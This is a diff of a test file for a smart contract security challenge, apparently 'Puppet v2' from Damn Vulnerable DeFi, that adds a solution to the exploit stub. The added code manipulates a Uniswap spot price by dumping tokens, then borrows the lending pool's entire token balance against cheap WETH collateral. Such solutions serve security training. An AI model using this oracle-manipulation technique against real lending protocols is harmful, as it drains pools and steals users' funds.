@@ -82,6 +82,19 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, this.token.balanceOf(attacker.address));
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp;
+        let path = [this.token.address, this.weth.address];
+        // damp hard DVF
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, path, attacker.address, deadline + 3600);
+        // Wrap ETH to WETH
+        let bounty = await this.token.balanceOf(this.lendingPool.address);
+        let collateral = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(bounty);
+        await this.weth.connect(attacker).deposit({value: collateral});
+        // Allow lending pool to use my WETH
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+        // borrow DVF for cheap
+        await this.lendingPool.connect(attacker).borrow(bounty);
     });
 
     after(async function () {
